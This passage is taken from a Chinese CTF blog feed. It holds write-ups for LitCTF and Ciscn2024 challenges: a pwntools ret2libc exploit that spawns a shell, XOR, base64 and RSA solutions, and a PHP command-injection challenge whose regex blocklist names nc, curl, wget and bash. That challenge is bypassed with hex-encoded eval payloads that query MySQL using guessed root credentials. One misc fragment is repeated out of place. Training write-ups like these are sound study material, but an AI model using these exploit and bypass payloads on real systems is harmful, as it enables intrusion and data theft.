p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;message:\\n&#x27;</span>, pay)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_addr = u64(io.recvuntil(<span class=\"string\">&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc_base = puts_addr - libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">bin_sh = libc_base + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>))</span><br><span class=\"line\">pay2 = <span class=\"string\">b&#x27;\\x00&#x27;</span> * (<span class=\"number\">0x68</span>) + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;message:&quot;</span>)</span><br><span class=\"line\">io.sendline(pay2)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<p>​\tflag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NSSCTF&#123;u_r_master_of_stackoverflow_and_intoverflow&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> Re：</h1>\n<h2 id=\"1-世界上最棒的程序员\"><a class=\"markdownIt-Anchor\" href=\"#1-世界上最棒的程序员\">#</a> 1、世界上最棒的程序员</h2>\n<p>​\tshift+f12 直接找到 flag：Flag:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LitCTF&#123;I_am_the_best_programmer_ever&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-ez_xor\"><a class=\"markdownIt-Anchor\" href=\"#2-ez_xor\">#</a> 2、ez_XOR：</h2>\n<p>​\t直接上源码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// [esp+0h] [ebp-80h]</span></span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> **v5; <span class=\"comment\">// [esp+4h] [ebp-7Ch]</span></span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> **v6; <span class=\"comment\">// [esp+8h] [ebp-78h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> Str1[<span class=\"number\">50</span>]; <span class=\"comment\">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> Str2[<span class=\"number\">26</span>]; <span class=\"comment\">// [esp+4Eh] [ebp-32h] BYREF</span></span><br><span class=\"line\">  __int16 v9; <span class=\"comment\">// [esp+68h] [ebp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v10; <span class=\"comment\">// [esp+6Ah] [ebp-16h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v11; <span class=\"comment\">// [esp+6Eh] [ebp-12h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v12; <span class=\"comment\">// [esp+72h] [ebp-Eh]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v13; <span class=\"comment\">// [esp+76h] [ebp-Ah]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v14; <span class=\"comment\">// [esp+7Ah] [ebp-6h]</span></span><br><span class=\"line\">  __int16 v15; <span class=\"comment\">// [esp+7Eh] [ebp-2h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  __main();</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(Str2, <span class=\"string\">&quot;E`&#125;J]OrQF[V8zV:hzpV&#125;fVF[t&quot;</span>);</span><br><span class=\"line\">  v9 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v10 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v11 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v12 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v13 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v14 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v15 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Enter The Right FLAG:&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%s&quot;</span>, Str1);</span><br><span class=\"line\">  XOR(Str1, <span class=\"number\">3</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(Str1, Str2) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;U Saved IT!\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Wrong!Try again!\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> main(v4, v5, v6);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\tXOR 函数如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">size_t</span> __cdecl <span class=\"title function_\">XOR</span><span class=\"params\">(<span class=\"type\">char</span> *Str, <span class=\"type\">char</span> a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> i; <span class=\"comment\">// [esp+2Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; ; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    result = <span class=\"built_in\">strlen</span>(Str);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( i &gt;= result )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    Str[i] ^= <span class=\"number\">3</span> * a2;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t那么，大致可以知道了，E`} J] OrQF [V8zV:hzpV} fVF [t 字段与 9 进行异或运算，所以，可以写出如下 exp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = <span class=\"string\">&quot;E`&#125;J]OrQF[V8zV:hzpV&#125;fVF[t&quot;</span></span><br><span class=\"line\">b = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">    c = <span class=\"built_in\">ord</span>(i) ^ <span class=\"number\">9</span></span><br><span class=\"line\">    b += <span class=\"built_in\">chr</span>(c)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(b)</span><br></pre></td></tr></table></figure>\n<p>​\tflag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LitCTF&#123;XOR_1s_3asy_to_OR&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-enbase64\"><a class=\"markdownIt-Anchor\" href=\"#3-enbase64\">#</a> 3、enbase64</h2>\n<p>​\t打断点动态调试一下。然后就能看到 source：gJ1BRjQie/FIWhEslq7GxbnL26M4+HXUtcpmVTKaydOP38of5v90ZSwrkYzCAuND</p>\n<p>​\t解码即可，再看 basecheck (Str1) 中有 str1 的值，然后 base64 解码即可：</p>\n<p>​\tflag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LitCTF&#123;B@5E64_l5_tooo0_E3sy!!!!!&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto:</h1>\n<h2 id=\"1-梦想是红色的-初级\"><a class=\"markdownIt-Anchor\" href=\"#1-梦想是红色的-初级\">#</a> 1、梦想是红色的 (初级)</h2>\n<p>自由友善公正公正敬业法治自由自由和谐平等自由自由公正法治诚信民主诚信自由自由诚信民主爱国友善平等诚信富强友善爱国自由诚信民主敬业爱国诚信民主友善爱国平等爱国爱国敬业敬业友善爱国公正敬业爱国敬业和谐文明诚信文明友善爱国自由诚信民主爱国爱国诚信和谐友善爱国自由友善平等爱国友善平等友善自由诚信自由平等爱国爱国敬业敬业友善爱国敬业敬业友善自由友善平等诚信自由法治诚信和谐</p>\n<p>​\t一眼社会主义核心价值观加密，无脑梭：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LitCTF&#123;为之则易,不为则难&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-hexhex初级\"><a class=\"markdownIt-Anchor\" href=\"#2-hexhex初级\">#</a> 2、Hex？Hex！(初级)</h2>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4c69744354467b746169313131636f6f6c6c616161217d</span><br></pre></td></tr></table></figure>\n<p>​\t提示 hex 了，无脑十六进制解密：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LitCTF&#123;tai111coollaaa!&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-你是我的关键词keyworld-初级\"><a class=\"markdownIt-Anchor\" href=\"#3-你是我的关键词keyworld-初级\">#</a> 3、你是我的关键词 (Keyworld) (初级)</h2>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">IFRURC&#123;X0S<span class=\"built_in\">_</span>YP3<span class=\"built_in\">_</span>JX<span class=\"built_in\">_</span>HBXV0PA&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t关键字加密，key 是 YOU，提示很明显：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LITCTF&#123;Y0U_AR3_MY_KEYW0RD&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-家人们谁懂啊rsa签到都不会-初级\"><a class=\"markdownIt-Anchor\" href=\"#4-家人们谁懂啊rsa签到都不会-初级\">#</a> 4、家人们！谁懂啊，RSA 签到都不会 (初级)</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> secret <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"></span><br><span class=\"line\">m = bytes_to_long(flag)</span><br><span class=\"line\">p = getPrime(<span class=\"number\">512</span>)</span><br><span class=\"line\">q = getPrime(<span class=\"number\">512</span>)</span><br><span class=\"line\">e = <span class=\"number\">65537</span></span><br><span class=\"line\">n = p*q</span><br><span class=\"line\">c = <span class=\"built_in\">pow</span>(m,e,n)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;p = <span class=\"subst\">&#123;p&#125;</span>&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;q = <span class=\"subst\">&#123;q&#125;</span>&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;c = <span class=\"subst\">&#123;c&#125;</span>&#x27;</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">p = 12567387145159119014524309071236701639759988903138784984758783651292440613056150667165602473478042486784826835732833001151645545259394365039352263846276073</span></span><br><span class=\"line\"><span class=\"string\">q = 12716692565364681652614824033831497167911028027478195947187437474380470205859949692107216740030921664273595734808349540612759651241456765149114895216695451</span></span><br><span class=\"line\"><span class=\"string\">c = 108691165922055382844520116328228845767222921196922506468663428855093343772017986225285637996980678749662049989519029385165514816621011058462841314243727826941569954125384522233795629521155389745713798246071907492365062512521474965012924607857440577856404307124237116387085337087671914959900909379028727767057</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t大佬直接用工具一把梭<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NwbW9ua2V5L0NyeXB0bw==\"> GitHub - spmonkey/Crypto</span> 直接工具直接解密即可，我不知为啥下载不了这个工具，所以直接上答案了：</p>\n<p>​\tflag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LitCTF&#123;it_is_easy_to_solve_question_when_you_know_p_and_q&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> Misc;</h1>\n<h2 id=\"1-what_1s_base-初级\"><a class=\"markdownIt-Anchor\" href=\"#1-what_1s_base-初级\">#</a> 1、What_1s_BASE (初级)</h2>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">TGl0Q1RGe0tGQ19DcjR6eV9UaHVyM2RheV9WX21lXzUwfQ==</span><br></pre></td></tr></table></figure>\n<p>​\t直接 base64 解码即可：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LitCTF&#123;KFC_Cr4zy_Thur3day_V_me_50&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-404notfound-初级\"><a class=\"markdownIt-Anchor\" href=\"#2-404notfound-初级\">#</a> 2、404notfound (初级)</h2>\n<p>​\t一张图片，记事本打开，前几行有 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LitCTF&#123;Its_404_but_1ts_n0t_a_page&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-这羽毛球怎么只有一半啊恼-初级\"><a class=\"markdownIt-Anchor\" href=\"#3-这羽毛球怎么只有一半啊恼-初级\">#</a> 3、这羽毛球怎么只有一半啊（恼 (初级)</h2>\n<p>​\t拖到 010 里修改高度，之后得到 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LitCTF&#123;Fl4g_0fcourse!&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-喜欢我的压缩包么-初级\"><a class=\"markdownIt-Anchor\" href=\"#4-喜欢我的压缩包么-初级\">#</a> 4、喜欢我的压缩包么 (初级)</h2>\n<p>​\t提示压缩包密码是 6 位数字，直接爆破解出密码是 114514，好臭的密码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LitCTF&#123;Do-u-like-my-zip-p4ck?&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"5-take-me-hand-初级\"><a class=\"markdownIt-Anchor\" href=\"#5-take-me-hand-初级\">#</a> 5、Take me hand (初级)</h2>\n<p>​\t流量包分析，随便追踪一个 http，在请求的 POST 数据中找到 flag，经过 url 解码之后得到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LitCTF&#123;Give_y0ur_hand_to_me!!!_plz&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"6-破损的图片初级\"><a class=\"markdownIt-Anchor\" href=\"#6-破损的图片初级\">#</a> 6、破损的图片 (初级)</h2>\n<p>​\t文件用 010editor 编辑，添上 % png…，也就是 89504E470D0A1A0A，再将图片重命名为.png 图片，打开图片便是 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LitCTF&#123;May you, the beauty of this world, always shine.&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"7-osint小麦果汁\"><a class=\"markdownIt-Anchor\" href=\"#7-osint小麦果汁\">#</a> 7、Osint 小麦果汁</h2>\n<p>​\t我 tm，想暴打出题人，算了，忍忍。</p>\n<p>​\t上面看到一个很明显的字符，看起来像是 wifi 名，hacker&amp;craft，直接在百度地图搜索黑客，发现了一个名字，黑客与精酿，flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LitCTF&#123;黑客与精酿&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"8-easy_shark\"><a class=\"markdownIt-Anchor\" href=\"#8-easy_shark\">#</a> 8、easy_shark</h2>\n<p>​\t又是个欺负我 010 有问题，真服了，想暴打出题人。</p>\n<p>​\t还是说下思路就行了吧，拖进 010，修改 90 00 为 00 00 即可，然后不用密码解压，追踪 http 流，在多个 http 流中找到了一个 php 一句话木马，然后再找，第五十几个就能找到个方程，然后两个 key，应该是仿射密码，以及 #后面是一个字符串，格式很想 flag。之后仿射密码解决：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LitCTF&#123;w13e5hake_1s_a_900d_t3a771c_t001_a&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"9-osint-探姬去哪了_0\"><a class=\"markdownIt-Anchor\" href=\"#9-osint-探姬去哪了_0\">#</a> 9、OSINT 探姬去哪了？_0</h2>\n<p>​\t又是社工 (T^T)：</p>\n<p>otfound (初级)</p>\n<p>​\t一张图片，记事本打开，前几行有 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LitCTF&#123;Its_404_but_1ts_n0t_a_page&#125;</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Game"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/9dd9bec.html",
            "url": "http://blog.g01den.top/posts/9dd9bec.html",
            "title": "Ciscn2024",
            "date_published": "2024-05-20T11:10:34.000Z",
            "content_html": "<h2 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> Web</h2>\n<h3 id=\"simple_php\"><a class=\"markdownIt-Anchor\" href=\"#simple_php\">#</a> Simple_php</h3>\n<p>​\t\t这个 Simple_php 一点儿也不 Simple (⋟﹏⋞)<br>\n​\t\t源码放这儿了：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">  <span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&#x27;open_basedir&#x27;</span>, <span class=\"string\">&#x27;/var/www/html/&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class=\"line\">  <span class=\"variable\">$cmd</span> = <span class=\"title function_ invoke__\">escapeshellcmd</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]); </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\\?|wget|\\&#x27;|\\&quot;|id|whoami/i&#x27;</span>, <span class=\"variable\">$cmd</span>)) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$cmd</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t\t很明显，POST 一个 cmd 进去，然后通过 escapeshellcmd 函数对参数进行转义，然后进行逆天的正则，之后 RCE。<br>\n​\t\t大概就是这样，还能干啥？全都给过滤了，还能咋绕过？<br>\n​\t\t首先是信息搜集，不过有用的似乎没多少，查看进程发现一个 MySQL 的进程，可以试着打一下 MySQL：</p>\n<blockquote>\n<p>mysql        277  0.0 16.9 1083992 89076 pts/0   Sl+  07:38   0:00 /usr/sbin/mariadbd --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/run/mysqld/mysqld.sock</p>\n</blockquote>\n<p>​\t\t看来是攻击 MySQL 了，猜测用户是 root，密码随便猜，这道题也是 root，运气好，猜中了，那么，先查数据库：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//构造这个查询语句</span><br><span class=\"line\"><span class=\"built_in\">echo</span> `mysql <span class=\"literal\">-uroot</span> <span class=\"literal\">-proot</span> <span class=\"literal\">-e</span> <span class=\"string\">&quot;SHOW DATABASES&quot;</span>`;</span><br><span class=\"line\">//payload </span><br><span class=\"line\">cmd=php+<span class=\"literal\">-r</span>+eval(hex2bin(substr(aa6563686f20606d7973716c202d75726f6f74202d70726f6f74202d65202253484f572044415441424153455322603b,<span class=\"number\">2</span>)));</span><br><span class=\"line\">//结果</span><br><span class=\"line\">Warning: Use of undefined constant aa6563686f20606d7973716c202d75726f6f74202d70726f6f74202d65202253454c45435420534348454d415f4e414d45204153205048505f434d532046524f4d20494e464f524d4154494f4e5f534348454d412e534348454d4154413b22603b - assumed <span class=\"string\">&#x27;aa6563686f20606d7973716c202d75726f6f74202d70726f6f74202d65202253454c45435420534348454d415f4e414d45204153205048505f434d532046524f4d20494e464f524d4154494f4e5f534348454d412e534348454d4154413b22603b&#x27;</span> (this will <span class=\"keyword\">throw</span> an Error <span class=\"keyword\">in</span> a future version of PHP) <span class=\"keyword\">in</span> Command line code on line <span class=\"number\">1</span></span><br><span class=\"line\">PHP_CMS</span><br><span class=\"line\">information_schema</span><br><span class=\"line\">mysql</span><br><span class=\"line\">performance_schema</span><br><span class=\"line\">PHP_CMS</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//构造这个查询语句</span><br><span class=\"line\"><span class=\"built_in\">echo</span> `mysql <span class=\"literal\">-uroot</span> <span class=\"literal\">-proot</span> <span class=\"literal\">-e</span> <span class=\"string\">&quot;select table_name as PHP_CMS from information_schema.TABLES where TABLE_SCHEMA=&#x27;PHP_CMS&#x27;&quot;</span>`;</span><br><span class=\"line\">//payload </span><br><span class=\"line\">cmd=php+<span class=\"literal\">-r</span>+eval(hex2bin(substr(aa6563686f20606d7973716c202d75726f6f74202d70726f6f74202d65202273656c656374207461626c655f6e616d65206173205048505f434d532066726f6d20696e666f726d6174696f6e5f736368656d612e5441424c4553207768657265205441424c455f534348454d413d275048505f434d532722603b,<span class=\"number\">2</span>)));</span><br><span class=\"line\">//结果</span><br><span class=\"line\">Warning: Use of undefined constant aa6563686f20606d7973716c202d75726f6f74202d70726f6f74202d65202273656c656374207461626c655f6e616d65206173205048505f434d532066726f6d20696e666f726d6174696f6e5f736368656d612e5441424c4553207768657265205441424c455f534348454d413d275048505f434d532722603b - assumed <span class=\"string\">&#x27;aa6563686f20606d7973716c202d75726f6f74202d70726f6f74202d65202273656c656374207461626c655f6e616d65206173205048505f434d532066726f6d20696e666f726d6174696f6e5f736368656d612e5441424c4553207768657265205441424c455f534348454d413d275048505f434d532722603b&#x27;</span> (this will <span class=\"keyword\">throw</span> an Error <span class=\"keyword\">in</span> a future version of PHP) <span class=\"keyword\">in</span> Command line code on line <span class=\"number\">1</span></span><br><span class=\"line\">PHP_CMS</span><br><span class=\"line\">F1ag_Se3Re7</span><br></pre></td></tr></table></figure>\n<p>​\t\t查一下这个 F1ag_Se3Re7，不出意外的话，应该 flag 在这里面：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//构造这个查询语句</span><br><span class=\"line\"><span class=\"built_in\">echo</span> `mysql <span class=\"literal\">-uroot</span> <span class=\"literal\">-proot</span> <span 